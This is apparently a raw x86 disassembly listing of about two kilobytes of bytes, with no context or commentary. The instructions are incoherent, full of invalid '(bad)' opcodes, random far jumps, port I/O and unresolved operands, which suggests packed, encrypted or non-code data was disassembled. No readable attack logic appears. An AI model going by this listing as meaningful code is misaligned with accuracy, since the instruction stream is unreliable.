  42089c:	pusha  
  42089d:	add    eax,0xcf09bf41
  4208a2:	test   DWORD PTR [edi],ecx
  4208a4:	js     0x4208e0
  4208a6:	and    al,0x9
  4208a8:	mov    edx,0x4ade289f
  4208ad:	aaa    
  4208ae:	mov    ebx,0xb8edfb60
  4208b3:	test   DWORD PTR [edi+0x241798b0],ecx
  4208b9:	mov    esi,?
  4208bb:	sub    ebp,DWORD PTR [esi]
  4208bd:	cli    
  4208be:	int    0x4b
  4208c0:	ss mov al,0xfb
  4208c3:	dec    ebp
  4208c4:	es xchg edx,eax
  4208c6:	push   0xffffffa7
  4208c8:	jae    0x420889
  4208ca:	inc    ebx
  4208cb:	xchg   edx,eax
  4208cc:	pop    ebx
  4208cd:	mov    bh,0x7d
  4208cf:	xchg   DWORD PTR [ebp-0x3ee67617],edi
  4208d5:	xlat   BYTE PTR ds:[ebx]
  4208d6:	cmp    eax,0xe6de8224
  4208db:	out    dx,al
  4208dc:	test   ebx,0x2b26a695
  4208e2:	test   al,0x6b
  4208e4:	test   DWORD PTR [esi-0xfa0d6ea],edx
  4208ea:	or     bh,BYTE PTR [eax+0x314f8dff]
  4208f0:	mov    ecx,0x244c0e37
  4208f5:	sub    al,0x45
  4208f7:	mov    dh,0x45
  4208f9:	into   
  4208fa:	retf   
  4208fb:	test   BYTE PTR [eax-0x74],bh
  4208fe:	cs popf 
  420900:	mov    dh,0xbd
  420902:	push   0xffffffb6
  420904:	or     edi,DWORD PTR [ebx-0x6fd7a92]
  42090a:	dec    ecx
  42090b:	imul   esi,DWORD PTR [ebp+0x77],0x7f9126e5
  420912:	loope  0x420931
  420914:	push   DWORD PTR [ecx]
  420916:	in     al,dx
  420917:	out    dx,eax
  420918:	cmp    DWORD PTR [eax+0x2104ab2],esi
  42091e:	gs push ebp
  420920:	cmp    al,0xcc
  420922:	mov    esp,0x7c7bbfd7
  420927:	in     eax,0x32
  420929:	imul   ebp,DWORD PTR [ebp+0x59],0x2e34c4bb
  420930:	adc    al,0x68
  420932:	mov    ?,WORD PTR [ebx-0x5f787f03]
  420938:	pop    ss
  420939:	pusha  
  42093a:	retf   
  42093b:	inc    esp
  42093c:	inc    ebp
  42093d:	repnz (bad) 
  42093f:	ror    bl,0xff
  420942:	mov    al,ds:0x2e30a925
  420947:	mov    al,0xd
  420949:	add    dl,BYTE PTR [edi]
  42094b:	mov    esp,0x254e2240
  420950:	aam    0x85
  420952:	add    DWORD PTR [edi],0x78
  420955:	add    DWORD PTR [esi+0x6bb6dfe9],esp
  42095b:	push   0x21
  42095d:	push   ebp
  42095e:	add    dl,BYTE PTR [ebp-0x68]
  420961:	push   eax
  420962:	call   0x6c29:0x4ddd58cc
  420969:	aam    0xaf
  42096b:	push   esi
  42096c:	inc    esi
  42096d:	cmp    edx,DWORD PTR [ebx-0x57]
  420970:	or     al,0xa9
  420972:	les    edi,FWORD PTR [ecx+0x6c]
  420975:	mov    BYTE PTR [edi-0x5950cd9],ah
  42097b:	adc    edx,DWORD PTR [esi-0x2e1392d3]
  420981:	inc    BYTE PTR [esi+0x17]
  420984:	adc    eax,0x7207cf82
  420989:	rol    BYTE PTR [ebx+0x62],cl
  42098c:	(bad)  
  42098d:	int    0x1
  42098f:	mov    ?,WORD PTR [ebx-0x4e]
  420992:	jp     0x4209b0
  420994:	adc    BYTE PTR [ebp+ebx*2-0x5fb82fde],dh
  42099b:	test   eax,0x8912da09
  4209a0:	push   ds
  4209a1:	sti    
  4209a2:	jle    0x420924
  4209a4:	sbb    al,0xbf
  4209a6:	xchg   ecx,eax
  4209a7:	jl     0x4209ec
  4209a9:	in     al,0x38
  4209ab:	jecxz  0x4209df
  4209ad:	mov    ebp,0xc2bc74a9
  4209b2:	test   BYTE PTR [esi-0x135d3161],0x9a
  4209b9:	jmp    0x5c59:0x52f56cc4
  4209c0:	inc    eax
  4209c1:	pop    ecx
  4209c2:	mov    al,ds:0xcb86fcea
  4209c7:	idiv   DWORD PTR [edx+eiz*8]
  4209ca:	sbb    DWORD PTR [ecx-0x7a],eax
  4209cd:	mov    ch,0x23
  4209cf:	int    0x0
  4209d1:	hlt    
  4209d2:	retf   0xb6ae
  4209d5:	hlt    
  4209d6:	xor    eax,0x8bc8085
  4209db:	ins    DWORD PTR es:[edi],dx
  4209dc:	std    
  4209dd:	fs int3 
  4209df:	and    bh,bh
  4209e1:	dec    ecx
  4209e2:	mov    bl,ah
  4209e4:	and    al,0x66
  4209e6:	inc    esi
  4209e7:	leave  
  4209e8:	cwde   
  4209e9:	mov    ecx,0x4f49c687
  4209ee:	outs   dx,BYTE PTR ds:[esi]
  4209ef:	repz scas eax,DWORD PTR es:[edi]
  4209f1:	test   eax,0x1bf44cd
  4209f6:	or     eax,0xa7c2333d
  4209fb:	repnz retf 
  4209fd:	and    eax,DWORD PTR [edi-0x547c5bcc]
  420a03:	test   eax,0x9d11ce44
  420a08:	push   0x32
  420a0a:	pop    edx
  420a0b:	mov    ds:0x142764e7,al
  420a10:	sbb    DWORD PTR [eax+0xf],edi
  420a13:	jb     0x420a62
  420a15:	xchg   ebx,eax
  420a16:	jnp    0x4209b7
  420a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a19:	mov    al,ch
  420a1b:	ins    BYTE PTR es:[edi],dx
  420a1c:	cmp    DWORD PTR [ecx],0x52
  420a1f:	sub    DWORD PTR [ebp+0x76],eax
  420a22:	js     0x4209c1
  420a24:	xchg   ecx,eax
  420a25:	or     BYTE PTR [ecx-0x6f],0xa0
  420a29:	cmc    
  420a2a:	hlt    
  420a2b:	adc    DWORD PTR [edi],ebp
  420a2d:	cmp    DWORD PTR [esp+ebp*4-0x70],ebp
  420a31:	jg     0x4209da
  420a33:	out    0x5b,eax
  420a35:	aad    0xe0
  420a37:	in     al,0xc1
  420a39:	add    DWORD PTR [ebx+0x2f7c3ef6],esi
  420a3f:	push   eax
  420a40:	les    ebp,FWORD PTR [edx]
  420a42:	dec    esi
  420a43:	je     0x420a1a
  420a45:	xchg   DWORD PTR [esi-0x6527e45e],eax
  420a4b:	fsub   DWORD PTR ds:0xf8af66d6
  420a51:	adc    ah,0x8d
  420a54:	push   esp
  420a55:	pop    edx
  420a56:	jnp    0x420ab1
  420a58:	push   esp
  420a59:	push   ebp
  420a5a:	scas   eax,DWORD PTR es:[edi]
  420a5b:	xor    DWORD PTR [edi],eax
  420a5d:	lods   eax,DWORD PTR ds:[esi]
  420a5e:	leave  
  420a5f:	push   esp
  420a60:	dec    eax
  420a61:	mov    ch,0x6b
  420a63:	inc    ecx
  420a64:	dec    esp
  420a65:	repnz pop esi
  420a67:	in     eax,0x9c
  420a69:	xor    al,0x50
  420a6b:	inc    eax
  420a6c:	xchg   ebx,eax
  420a6d:	shl    ebx,1
  420a6f:	scas   eax,DWORD PTR es:[edi]
  420a70:	retf   
  420a71:	mov    DWORD PTR [eax],edx
  420a73:	xchg   esi,eax
  420a74:	push   esi
  420a75:	aaa    
  420a76:	lock pusha 
  420a78:	pop    ss
  420a79:	repnz or ecx,DWORD PTR [ecx-0x41]
  420a7d:	xchg   ebx,eax
  420a7e:	fs cs dec ebx
  420a81:	imul   edx,DWORD PTR [esi],0x61c5b545
  420a87:	lahf   
  420a88:	out    dx,al
  420a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a8a:	cmp    bh,bh
  420a8c:	jae    0x420a44
  420a8e:	and    al,0x9c
  420a90:	push   edx
  420a91:	test   DWORD PTR es:[eax-0x35e9af61],esi
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	mov    ebx,0xf7641ff5
  420a9e:	fisttp WORD PTR [ebx+0x2b978b32]
  420aa4:	and    eax,0x372fa44b
  420aa9:	mov    BYTE PTR [edi-0x6b],dl
  420aac:	jecxz  0x420a65
  420aae:	lea    ebp,[edx]
  420ab0:	jmp    0xb303:0x1668ba8f
  420ab7:	lods   eax,DWORD PTR ds:[esi]
  420ab8:	dec    edx
  420ab9:	aam    0x39
  420abb:	sub    DWORD PTR [eax-0x202158ba],ecx
  420ac1:	push   0xffffffd4
  420ac3:	mov    ah,0x76
  420ac5:	xor    edx,ebx
  420ac7:	dec    esi
  420ac8:	mov    ah,0x3
  420aca:	not    DWORD PTR [esi]
  420acc:	pop    esp
  420acd:	das    
  420ace:	leave  
  420acf:	cwde   
  420ad0:	mov    al,ds:0x9c71160f
  420ad5:	enter  0x690c,0xb4
  420ad9:	in     al,dx
  420ada:	xchg   ebp,eax
  420adb:	enter  0xdce4,0x37
  420adf:	sbb    cl,BYTE PTR [ebp-0x3dc0c6bf]
  420ae5:	and    al,0x39
  420ae7:	repnz (bad) 
  420ae9:	clc    
  420aea:	(bad)  
  420aec:	dec    edx
  420aed:	adc    al,0x78
  420aef:	lahf   
  420af0:	push   ecx
  420af1:	add    al,BYTE PTR [esi+0x0]
  420af4:	ins    DWORD PTR es:[edi],dx
  420af5:	mov    bl,0x34
  420af7:	mov    dh,0x63
  420af9:	dec    eax
  420afa:	jmp    0x420b43
  420afc:	pop    es
  420afd:	mov    bl,BYTE PTR [edi]
  420aff:	lahf   
  420b00:	fstp   DWORD PTR [ecx+0x1ede17a8]
  420b06:	leave  
  420b07:	push   edi
  420b08:	sar    DWORD PTR [ebx-0x6f8025a8],0x57
  420b0f:	xor    eax,0xfe818494
  420b14:	dec    ebx
  420b15:	(bad)  
  420b16:	das    
  420b17:	jne    0x420aca
  420b19:	sbb    eax,ebx
  420b1b:	imul   edi,DWORD PTR [edi+0x2f],0x3
  420b1f:	repz and al,0x87
  420b22:	mov    al,0x28
  420b24:	ficom  WORD PTR [ebx]
  420b26:	adc    eax,DWORD PTR [eax+0x4dd8ac5e]
  420b2c:	test   DWORD PTR [eax+0xc],edi
  420b2f:	push   cs
  420b30:	push   cs
  420b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b32:	jl     0x420aef
  420b34:	adc    bl,cl
  420b36:	ret    0x8c8a
  420b39:	in     al,0xc6
  420b3b:	je     0x420b96
  420b3d:	jmp    0x3a7a:0xc11efab8
  420b44:	imul   ebp,DWORD PTR [edx],0xffffff8a
  420b47:	add    BYTE PTR [ebx],dh
  420b49:	and    al,bh
  420b4b:	push   esi
  420b4c:	pop    eax
  420b4d:	jne    0x420b71
  420b4f:	bound  ebp,QWORD PTR [edi-0x1e265678]
  420b55:	inc    edx
  420b56:	and    eax,ecx
  420b58:	ret    
  420b59:	pop    ebp
  420b5a:	repnz xchg edi,eax
  420b5c:	dec    edx
  420b5d:	sub    al,dh
  420b5f:	or     dl,BYTE PTR [ebx]
  420b61:	mov    eax,0x7f5c8fee
  420b66:	push   esp
  420b67:	pushf  
  420b68:	(bad)  
  420b69:	arpl   WORD PTR cs:[edi-0x20],ax
  420b6d:	mov    ebx,0x2bc3a6b4
  420b72:	sub    DWORD PTR [edi],ebp
  420b74:	sahf   
  420b75:	sbb    ah,BYTE PTR ds:0xc8a7f9a1
  420b7b:	popf   
  420b7c:	gs pop edx
  420b7e:	push   0x4f9fa127
  420b83:	pop    ds
  420b84:	aam    0xc8
  420b86:	inc    edi
  420b87:	out    0xa5,eax
  420b89:	mov    eax,ds:0x778fb754
  420b8e:	test   eax,0x24a183aa
  420b93:	imul   esi,eax,0xac3b5b2e
  420b99:	fdiv   QWORD PTR [edi+0x259e9804]
  420b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba0:	cmp    eax,0x8d5089c0
  420ba5:	out    dx,eax
  420ba6:	inc    eax
  420ba7:	adc    al,0xcf
  420ba9:	jge    0x420c1a
  420bab:	add    BYTE PTR [eax+0x1b],ch
  420bae:	rol    DWORD PTR [edi-0x28],cl
  420bb1:	adc    eax,0xeed80d41
  420bb6:	leave  
  420bb7:	xor    bl,BYTE PTR [ebx+0x4a]
  420bba:	aad    0x27
  420bbc:	or     BYTE PTR ds:0x4dd2c749,dl
  420bc2:	xchg   esp,eax
  420bc3:	call   0xe5005754
  420bc8:	sbb    al,0x27
  420bca:	hlt    
  420bcb:	imul   ebp,DWORD PTR [edi],0x7b
  420bce:	loopne 0x420bd3
  420bd0:	push   ebx
  420bd1:	push   ds
  420bd2:	aaa    
  420bd3:	or     al,0x6c
  420bd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bd6:	jge    0x420b75
  420bd8:	icebp  
  420bd9:	cmp    eax,0x4a75ae7c
  420bde:	test   BYTE PTR [ebx-0x6887876e],ah
  420be4:	ds (bad) 
  420be6:	jl     0x420c00
  420be8:	pop    esp
  420be9:	mov    edi,0xafaf806e
  420bee:	lea    ebx,[ebp+0x716048fb]
  420bf4:	pop    ebp
  420bf5:	stos   BYTE PTR es:[edi],al
  420bf6:	jecxz  0x420ba9
  420bf8:	and    eax,0xfa51a53f
  420bfd:	cmp    ebx,DWORD PTR [eax-0x53]
  420c00:	ror    ecx,cl
  420c02:	scas   al,BYTE PTR es:[edi]
  420c03:	mov    edi,0xd026a003
  420c08:	push   esi
  420c09:	jp     0x420bff
  420c0b:	aad    0xec
  420c0d:	sbb    BYTE PTR [eax+edi*2+0x5f078c86],bl
  420c14:	(bad)  
  420c15:	cmp    eax,DWORD PTR [edi-0x4407b595]
  420c1b:	into   
  420c1c:	ds out 0x97,eax
  420c1f:	(bad)  
  420c20:	and    BYTE PTR [edx+0x27],ch
  420c23:	int3   
  420c24:	push   eax
  420c25:	push   ebp
  420c26:	mov    dl,0xee
  420c28:	sbb    al,0x24
  420c2a:	daa    
  420c2b:	(bad)
  420c2e:	mov    esp,0xda353a4
  420c33:	fdivr  QWORD PTR [eax+0x361a04f7]
  420c39:	(bad)  
  420c3a:	ds jbe 0x420cb7
  420c3d:	daa    
  420c3e:	xchg   ebx,eax
  420c3f:	popa   
  420c40:	jo     0x420c56
  420c42:	ror    DWORD PTR [eax],1
  420c44:	mov    ebx,0x4cf0c4bd
  420c49:	icebp  
  420c4a:	add    dh,BYTE PTR [ebp-0x6f1dc9d1]
  420c50:	mov    ebx,0xe87ba0e9
  420c55:	adc    ecx,ebp
  420c57:	cmp    DWORD PTR [eax+0x1b17049a],esp
  420c5d:	sub    al,0xb6
  420c5f:	icebp  
  420c60:	mov    ds:0x579ec314,al
  420c65:	xchg   edx,eax
  420c66:	sbb    edi,DWORD PTR [edx-0x7cff90fc]
  420c6c:	dec    esi
  420c6d:	add    BYTE PTR [eax],al
  420c6f:	add    BYTE PTR [eax],al
  420c71:	add    BYTE PTR [ecx],al
  420c73:	jge    0x420c4d
  420c75:	mov    ebp,0xfd65bdfc
  420c7a:	or     cl,BYTE PTR [ecx-0x738147a9]
  420c80:	test   BYTE PTR [edi-0x5b],dh
  420c83:	xchg   BYTE PTR [ecx],al
  420c85:	add    bl,dh
  420c87:	add    al,0x0
  420c89:	add    BYTE PTR [ecx],bh
  420c8b:	(bad)  
  420c8c:	mov    ah,0x4d
  420c8e:	cli    
  420c8f:	mov    eax,0x6d456ca9
  420c94:	sbb    edi,ebx
  420c96:	gs addr16 pop esi
  420c99:	(bad)  
  420c9a:	push   edi
  420c9b:	ficomp WORD PTR [edi-0x5a6549b3]
  420ca1:	dec    eax
  420ca2:	mov    ebp,0x8ffb2066
  420ca7:	mov    cl,0x63
  420ca9:	mov    ecx,0xd6e0e192
  420cae:	inc    edi
  420caf:	mov    esi,ebp
  420cb1:	sub    BYTE PTR [esi],ah
  420cb3:	and    eax,0xd2e93b64
  420cb8:	or     BYTE PTR [ecx-0x3b8ce1a0],bl
  420cbe:	xchg   DWORD PTR [edi+0x4e750910],ebx
  420cc4:	pop    esi
  420cc5:	retf   0xfc68
  420cc8:	xor    BYTE PTR [ecx],cl
  420cca:	jne    0x420ccd
  420ccc:	(bad)  
  420ccd:	push   0x1
  420ccf:	shl    DWORD PTR [edi-0x61],cl
  420cd2:	in     al,0xc
  420cd4:	xchg   edi,eax
  420cd5:	in     eax,0xea
  420cd7:	fsub   QWORD PTR [edx]
  420cd9:	adc    DWORD PTR [esi],esp
  420cdb:	stos   DWORD PTR es:[edi],eax
  420cdc:	cmp    eax,DWORD PTR [ecx+0x5e]
  420cdf:	mov    esi,0xc9b1edb8
  420ce4:	or     al,0x9a
  420ce6:	dec    esi
  420ce7:	cwde   
  420ce8:	inc    ebp
  420ce9:	sbb    cl,BYTE PTR [eax+edx*1-0x2a5c1764]
  420cf0:	pusha  
  420cf1:	cmp    bh,cl
  420cf3:	ret    0x417
  420cf6:	lock aad 0x6a
  420cf9:	push   cs
  420cfa:	(bad)  
  420cfb:	fisubr WORD PTR fs:[ebp+0x30cf5442]
  420d02:	in     al,dx
  420d03:	adc    al,0x50
  420d05:	xor    BYTE PTR [edx-0x6],ah
  420d08:	inc    esp
  420d09:	jp     0x420d68
  420d0b:	je     0x420d1c
  420d0d:	sub    eax,0x2ebcef4b
  420d12:	out    0x98,eax
  420d14:	adc    ebp,DWORD PTR [ebx-0x2578a36f]
  420d1a:	add    eax,0xc5724051
  420d1f:	mov    ch,BYTE PTR [edi+0x6557409a]
  420d25:	cs enter 0x1e34,0x8e
  420d2a:	fwait
  420d2b:	adc    BYTE PTR [ebx+0xba366a],dl
  420d31:	jg     0x420cee
  420d33:	out    0x62,eax
  420d35:	adc    cl,dl
  420d37:	adc    eax,0x389f670c
  420d3c:	or     ebp,DWORD PTR [edi]
  420d3e:	popa   
  420d3f:	int    0x82
  420d41:	mov    eax,DWORD PTR [ebp-0x29331a68]
  420d47:	pop    es
  420d48:	dec    ebp
  420d49:	mov    edi,0xc892d0b5
  420d4e:	arpl   WORD PTR fs:[eax-0x67],cx
  420d52:	(bad)  
  420d54:	mov    edx,0x8eec5ef7
  420d59:	fmul   QWORD PTR [edi+0x20]
  420d5c:	sub    eax,0x1ed710ad
  420d61:	and    DWORD PTR [eax+0x72],ebp
  420d64:	stos   BYTE PTR es:[edi],al
  420d65:	data16 jbe 0x420d87
  420d68:	dec    edx
  420d69:	fdivr  st(3),st
  420d6b:	sbb    cl,BYTE PTR [ebx-0x4e56196f]
  420d71:	add    al,0x78
  420d73:	jle    0x420de9
  420d75:	adc    eax,DWORD PTR [ecx]
  420d77:	iret   
  420d78:	and    BYTE PTR [eax],bh
  420d7a:	fcom   st(0)
  420d7c:	or     eax,0xd93bf83c
  420d81:	js     0x420d6f
  420d83:	cmp    BYTE PTR [ecx+esi*4+0x64016755],bl
  420d8a:	dec    ecx
  420d8b:	mov    ebp,DWORD PTR [edi-0x5e582a7c]
  420d91:	xchg   ebx,eax
  420d92:	xchg   ebp,eax
  420d93:	pop    ecx
  420d94:	(bad)  
  420d95:	out    0x1d,eax
  420d97:	daa    
  420d98:	lods   eax,DWORD PTR ds:[esi]
  420d99:	jmp    0x420dc2
  420d9b:	ds loope 0x420d1f
  420d9e:	push   ecx
  420d9f:	fbstp  TBYTE PTR [edx-0x12]
  420da2:	fisttp DWORD PTR [eax-0x29746f81]
  420da8:	push   ecx
  420da9:	gs leave 
  420dab:	sub    DWORD PTR [edx+0x1a4599a7],0xffffff9e
  420db2:	jne    0x420d7a
  420db4:	pop    ecx
  420db5:	and    al,0x5c
  420db7:	lahf   
  420db8:	jecxz  0x420d72
  420dba:	or     cl,BYTE PTR [eax-0x4b]
  420dbd:	mov    edx,gs
  420dbf:	inc    eax
  420dc0:	sbb    edx,DWORD PTR [ebp-0x4a]
  420dc3:	or     BYTE PTR [ebx+0x3274c66e],cl
  420dc9:	fadd   st,st(5)
  420dcb:	fadd   st(4),st
  420dcd:	outs   dx,DWORD PTR ds:[esi]
  420dce:	repz sbb al,0xeb
  420dd1:	sub    ah,BYTE PTR [esi-0x67650ab0]
  420dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dd8:	dec    esp
  420dd9:	aam    0xb9
  420ddb:	cmp    esp,DWORD PTR [esi+esi*4-0x33b66482]
  420de2:	add    al,0xd3
  420de4:	add    DWORD PTR [esi+0x19],esi
  420de7:	sub    DWORD PTR [edi],edi
  420de9:	inc    ebp
  420dea:	add    dh,BYTE PTR [esi+0x40]
  420ded:	xchg   esi,eax
  420dee:	sub    BYTE PTR [ecx-0x79],cl
  420df1:	lods   al,BYTE PTR ds:[esi]
  420df2:	dec    esi
  420df3:	add    BYTE PTR [ecx+0x25edd363],ah
  420df9:	enter  0x5082,0x1c
  420dfd:	mov    ah,al
  420dff:	xchg   DWORD PTR [esi-0x449e195f],edx
  420e05:	mov    bl,0x30
  420e07:	push   ds
  420e08:	jo     0x420e16
  420e0a:	add    BYTE PTR [esi],dh
  420e0c:	sbb    BYTE PTR [ebx],cl
  420e0e:	inc    esp
  420e0f:	stos   BYTE PTR es:[edi],al
  420e10:	adc    ebp,DWORD PTR [ebx+edi*8+0x5e]
  420e14:	dec    ebp
  420e15:	addr16 pushf 
  420e17:	adc    cl,BYTE PTR [ecx+0x62ba2858]
  420e1d:	or     WORD PTR [ebx-0x46],0xff99
  420e22:	(bad)  
  420e23:	sti    
  420e24:	idiv   BYTE PTR [ebp+esi*2+0x6b]
  420e28:	(bad)
  420e2d:	ror    BYTE PTR [eax+0x4c],cl
  420e30:	es fwait
  420e32:	or     esp,DWORD PTR [ebp+0x22]
  420e35:	inc    ecx
  420e36:	popf   
  420e37:	and    BYTE PTR [eax+0x59],cl
  420e3a:	adc    DWORD PTR [edi],ebx
  420e3c:	adc    ebx,DWORD PTR [edx-0x41d86713]
  420e42:	scas   al,BYTE PTR es:[edi]
  420e43:	push   edi
  420e44:	lahf   
  420e45:	ins    BYTE PTR es:[edi],dx
  420e46:	ret    
  420e47:	mov    bl,0xb8
  420e49:	stos   DWORD PTR es:[edi],eax
  420e4a:	outs   dx,BYTE PTR ds:[esi]
  420e4b:	out    0xb3,al
  420e4d:	mov    ds:0xb42a6e5c,al
  420e52:	push   esp
  420e53:	xor    DWORD PTR [esi-0x12899ae7],edx
  420e59:	loopne 0x420e85
  420e5b:	pop    ds
  420e5c:	mov    dh,0xdb
  420e5e:	or     dl,al
  420e60:	loope  0x420e43
  420e62:	xchg   esp,eax
  420e63:	es dec eax
  420e65:	mov    bh,0xf2
  420e67:	mov    esi,0x8faec170
  420e6c:	pop    esp
  420e6d:	les    edx,FWORD PTR [edi+eiz*8]
  420e70:	mov    cl,0x75
  420e72:	imul   esi,DWORD PTR [ebp-0x44],0xebcb4c19
  420e79:	leave  
  420e7a:	push   ax
  420e7c:	std    
  420e7d:	dec    esi
  420e7e:	fwait
  420e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e80:	adc    DWORD PTR [ecx],esp
  420e82:	std    
  420e83:	xchg   ebp,eax
  420e84:	aaa    
  420e85:	adc    ebp,DWORD PTR [esi+0x28afe089]
  420e8b:	xchg   ebp,eax
  420e8c:	mov    DWORD PTR [eax-0x3560912],0xfb3b815e
  420e96:	imul   eax,DWORD PTR [edx+edx*8],0x59
  420e9a:	(bad)  
  420e9b:	lea    ebx,[esi-0x76]
  420e9e:	fmul   QWORD PTR [ebp-0x2a]
  420ea1:	retf   
  420ea2:	cmp    BYTE PTR [ecx],bh
  420ea4:	in     eax,0xf1
  420ea6:	test   DWORD PTR [esi+eax*8],ebx
  420ea9:	in     eax,0x3c
  420eab:	test   DWORD PTR [edi],edx
  420ead:	mov    ebx,0x19643887
  420eb2:	or     eax,0xba72a8c3
  420eb7:	lock push ds
  420eb9:	pop    ebp
  420eba:	push   cs
  420ebb:	lock aad 0xd5
  420ebe:	push   es
  420ebf:	std    
  420ec0:	outs   dx,DWORD PTR ds:[esi]
  420ec1:	xor    BYTE PTR [eax],0x11
  420ec4:	(bad)  
  420ec5:	bound  edi,QWORD PTR [eax-0x1f]
  420ec8:	push   ebx
  420ec9:	mov    bh,0xd1
  420ecb:	int    0xb6
  420ecd:	les    ecx,FWORD PTR [eax]
  420ecf:	mov    ecx,0x3bd2099b
  420ed4:	pop    ebx
  420ed5:	rcr    BYTE PTR [ebx+0x51],0xfd
  420ed9:	push   ss
  420eda:	mov    dl,0x5f
  420edc:	int    0x38
  420ede:	xchg   edi,eax
  420edf:	and    DWORD PTR [esi-0x39],ebx
  420ee2:	sub    DWORD PTR [edx-0x49b37f4d],edx
  420ee8:	ds addr16 addr16 or dl,cl
  420eed:	jl     0x420f35
  420eef:	adc    al,0xff
  420ef1:	push   ss
  420ef2:	xchg   ebp,eax
  420ef3:	mov    ds:0x1bef7b71,eax
  420ef8:	dec    edx
  420ef9:	adc    edi,DWORD PTR [edi-0xe]
  420efc:	cmp    al,0x85
  420efe:	push   eax
  420eff:	xend   
  420f02:	push   ds
  420f03:	inc    edx
  420f04:	rol    BYTE PTR [eax],1
  420f06:	fidivr DWORD PTR [edi+0x92a0b8b]
  420f0c:	mov    esi,0x7dc9f1f5
  420f11:	add    al,0x0
  420f13:	rcl    dh,1
  420f15:	and    BYTE PTR [ecx-0x3d],dl
  420f18:	sahf   
  420f19:	enter  0xa58a,0xef
  420f1d:	retf   
  420f1e:	push   edx
  420f1f:	sti    
  420f20:	ret    0xdf94
  420f23:	xor    DWORD PTR [esi+0x7b06a96b],edx
  420f29:	jae    0x420f9b
  420f2b:	mov    esp,0x1cf65420
  420f30:	pop    edx
  420f31:	mov    edi,ebp
  420f33:	div    DWORD PTR [edx+eax*2]
  420f36:	inc    esi
  420f37:	push   cs
  420f38:	cli    
  420f39:	out    0x90,al
  420f3b:	cmp    eax,0xfc9b799d
  420f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f41:	mov    ds:0x5127d353,eax
  420f46:	or     DWORD PTR [ebx+0x12],esp
  420f49:	pop    ds
  420f4a:	mov    WORD PTR [ebp-0x2adb667e],?
  420f50:	sbb    DWORD PTR [ebp-0x7],0x8e4338e3
  420f57:	inc    ebx
  420f58:	pusha  
  420f59:	push   ebp
  420f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f5b:	cmp    BYTE PTR [edi],bh
  420f5d:	cmp    al,0x4d
  420f5f:	fisttp QWORD PTR ds:0x6642443a
  420f65:	into   
  420f66:	pop    ebp
  420f67:	pop    edx
  420f68:	rcr    DWORD PTR [esi+edx*4-0x45],0xaf
  420f6d:	and    BYTE PTR [ebx-0x49af7675],ch
  420f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f74:	inc    ebp
  420f75:	ficomp DWORD PTR [edi]
  420f77:	dec    edx
  420f78:	sub    eax,0x23dba967
  420f7d:	xchg   DWORD PTR [edi],eax
  420f7f:	rcr    DWORD PTR [edi-0x2f],1
  420f82:	mov    bh,0xed
  420f84:	mov    dl,0xcd
  420f86:	sahf   
  420f87:	push   edi
  420f88:	adc    eax,0x1681413d
  420f8d:	mov    dl,0xe6
  420f8f:	sub    al,0xe0
  420f91:	pushf  
  420f92:	std    
  420f93:	clc    
  420f94:	sar    DWORD PTR [eax+ecx*4+0x14eb2eb1],1
  420f9b:	test   al,0x92
  420f9d:	xchg   ecx,eax
  420f9e:	inc    edi
  420f9f:	sub    DWORD PTR [edx-0x6e2b04a9],ebx
  420fa5:	mov    ebx,DWORD PTR [ebp+ebp*4-0x3a]
  420fa9:	sub    BYTE PTR [ebx+ecx*1+0x2f],0x18
  420fae:	push   eax
  420faf:	cwde   
  420fb0:	or     ah,BYTE PTR [edx-0x2dfaa1cf]
  420fb6:	mov    ebp,0xf8341138
  420fbb:	rcl    DWORD PTR [esi-0x1e],0xc0
  420fbf:	add    al,0xd6
  420fc1:	add    DWORD PTR [esi+eax*2],esi
  420fc4:	jmp    0x420fca
  420fc6:	jbe    0x420fa2
  420fc8:	mov    DWORD PTR [edx],edx
  420fca:	push   cs
  420fcb:	data16 jle 0x420f78
  420fce:	add    ebx,DWORD PTR [edx+ebx*1+0x18]
  420fd2:	cdq    
  420fd3:	iret   
  420fd4:	mov    al,0x4a
  420fd6:	pop    edi
  420fd7:	test   BYTE PTR [eax],bl
  420fd9:	test   BYTE PTR [edi-0x21],bh
  420fdc:	add    cl,BYTE PTR [ecx]
  420fde:	xor    eax,0x1af388d1
  420fe3:	loopne 0x421033
  420fe5:	and    DWORD PTR [ecx+0x2cdfd397],0x21
  420fec:	cld    
  420fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fef:	outs   dx,DWORD PTR ds:[esi]
  420ff0:	mov    ds:0xef5930a9,eax
  420ff5:	(bad)  
  420ff6:	mov    ds:0x87fa018c,al
  420ffb:	push   ds
  420ffc:	out    dx,eax
  420ffd:	js     0x420fb8
  420fff:	add    BYTE PTR [esi+0x5e514d51],dh
  421005:	loop   0x421021
  421007:	xchg   edx,eax
  421008:	add    esp,DWORD PTR [ecx+0x65298482]
  42100e:	jp     0x421005
  421010:	ds adc eax,0x6242683a
  421016:	retf   0x58bc
  421019:	ret    
  42101a:	mov    eax,ds:0x5aba5de7
  42101f:	xchg   BYTE PTR [ecx-0x63],ch
  421022:	rol    BYTE PTR [edx-0x5f],cl
  421025:	fldl2t 
  421027:	out    dx,al
  421028:	in     al,dx
  421029:	(bad)  
  42102a:	xor    eax,0x80039ac5
  42102f:	(bad)  
  421030:	ins    BYTE PTR es:[edi],dx
  421031:	or     eax,0x11f144db
  421036:	(bad)  
  421037:	addr16 mov ebx,0xfab0c57
  42103d:	sub    al,0x1f
  42103f:	add    DWORD PTR [edi+0x6a],esi
  421042:	add    BYTE PTR [ecx-0x65d5c984],bl
  421048:	cld    
  421049:	outs   dx,BYTE PTR ds:[esi]
  42104a:	xor    ch,BYTE PTR [eax-0x3334456d]
  421050:	push   cs
  421051:	shl    BYTE PTR ds:0xed0c5543,1
  421057:	cs daa 
  421059:	cmc    
  42105a:	out    0xb6,al
  42105c:	dec    edi
